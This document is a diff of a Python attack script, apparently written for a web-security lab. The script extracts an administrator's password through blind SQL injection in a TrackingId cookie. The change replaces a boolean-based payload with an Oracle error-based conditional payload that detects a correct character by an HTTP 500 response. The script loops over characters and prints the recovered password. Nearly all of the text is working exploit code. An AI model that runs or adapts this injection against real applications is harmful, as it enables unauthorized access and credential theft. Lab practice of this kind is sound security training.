@@ -4,13 +4,11 @@ import requests
 import urllib3
 import argparse
 
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 default_proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"}
 
-def sqli(url, session, trackid, proxies=None):
+def sqli(url,session,trackid, proxies=None):
     password = ""
     j = 1
     arr="abcdefghijklmnopqrstuvwxyz0123456789"
@@ -19,21 +17,22 @@ def sqli(url, session, trackid, proxies=None):
         found = False
 
         for i in arr:  
-            sqli_payload = f"' AND (SELECT SUBSTRING(password, {j}, 1) FROM users WHERE username='administrator')='{i}"
+            sqli_payload = f"'||(SELECT CASE WHEN SUBSTR(password,{j},1)='{i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             
-            cookies = {
-                "TrackingId": f"{trackid}{sqli_payload_encoded}",
+            
+            cookie = {
+                "TrackingId": f"{trackid}{sqli_payload_encoded}",  
                 "session": f"{session}"
             }
 
             try:
                 
-                response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+                response = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
 
                 
-                if "Welcome" in response.text:  
-                    password += i  
+                if 500 == response.status_code:  
+                    password += i
                     sys.stdout.write(f"\r[+] Current password: {password}")  
                     sys.stdout.flush()
                     j += 1  
@@ -42,16 +41,13 @@ def sqli(url, session, trackid, proxies=None):
 
             except requests.exceptions.RequestException as e:
                 print(f"\n[!] Request error: {e}")
-                print("[!] Aborting the attack.")
                 return
 
+        
         if not found:
             break
 
-    if password:
-        print(f"\n[+] Administrator password successfully retrieved: {password}")
-    else:
-        print("\n[!] Password retrieval failed. No match found.")
+    print(f"\n[+] Administrator password retrieved: {password}")
 
 def main():
     
